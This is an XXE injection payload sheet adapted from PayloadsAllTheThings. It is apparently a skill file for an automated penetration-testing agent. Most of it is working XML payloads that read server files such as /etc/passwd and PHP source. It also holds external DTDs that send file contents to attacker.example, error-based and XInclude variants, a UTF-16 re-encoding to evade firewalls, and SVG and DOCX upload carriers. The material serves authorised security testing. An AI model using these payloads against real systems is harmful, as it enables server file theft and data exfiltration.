---
description: php://filter read, external-DTD and error-based exfiltration, XInclude/UTF-16/CDATA bypasses, carriers (SOAP, SVG, DOCX)
skill: xxe-testing
source: PayloadsAllTheThings — XXE Injection
source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
source_license: MIT; see THIRD_PARTY_NOTICES.md
---

# XXE (XML External Entity) Payloads

> Source: PayloadsAllTheThings — XXE Injection

## Classic XXE — File Read

### PHP Source Code (Base64)

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<foo>&xxe;</foo>
```

## Blind XXE — Out-of-Band (OOB)

### Data Exfiltration via External DTD

`attacker.example` here is a host that **serves** `ext.dtd`. Vigil's interactsh server only
records requests, so this needs an operator-provisioned listener (`$DIR/.listener_url`,
`agent/shared-constraints.md` §12); exfiltrate into the minted `$OOB_HOST` as a subdomain label.
Without a listener, use the local-DTD override under "Error-Based XXE", which needs no hosting.

**Malicious XML:**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://attacker.example/ext.dtd">
  %ext;
  %eval;
  %exfil;
]>
<root></root>
```

**ext.dtd hosted on attacker server:**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/?data=%file;'>">
```

## Error-Based XXE

Using local DTD file override (Linux — `/usr/share/xml/fontconfig/fonts.dtd`):

```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % constant 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    <!ELEMENT aa (bb'>
  %local_dtd;
]>
<message>text</message>
```

## XInclude and Encoding Bypasses

**XInclude** is the vector when you control one value inside a document but not the DOCTYPE (the
server builds the XML around your input, e.g. a SOAP field):

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

**UTF-16** re-encoding evades WAF patterns that match ASCII `<!ENTITY`/`SYSTEM`; the parser decodes
it normally:

```bash
printf '%s' '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/hostname">]><x>&e;</x>' \
  | iconv -f UTF-8 -t UTF-16 > "$DIR/scans/xxe_utf16.xml"   # host side; the runtime sees it as
# /engagements/$ENGAGEMENT_KEY/scans/xxe_utf16.xml for curl --data-binary @<path>
```

**CDATA wrapper** for files containing `<` or `&` that break the document when inlined: the
parameter entities must be joined in an external DTD, so it needs a hosted DTD (the
operator-provisioned listener, `agent/shared-constraints.md` §12; interactsh serves nothing):

```xml
<!DOCTYPE data [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/fstab">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://<listener>/wrapper.dtd">
  %dtd;
]>
<data>&all;</data>
<!-- wrapper.dtd:  <!ENTITY all "%start;%file;%end;"> -->
```

## XXE in Different Contexts

### SOAP

Place the DOCTYPE at the document root, before the SOAP envelope.

### SVG Image Upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### DOCX / XLSX (Office Documents)

Inject into the inner XML (e.g., `word/document.xml` or `xl/sharedStrings.xml`):

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [
  <!ENTITY % asd SYSTEM "http://attacker.example/ext.dtd">
  %asd;
  %c;
]>
<cdl>&rrr;</cdl>
```

**ext.dtd** hosted on attacker server:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://attacker.example/?data=%file;'>">
```

Re-zip and upload.
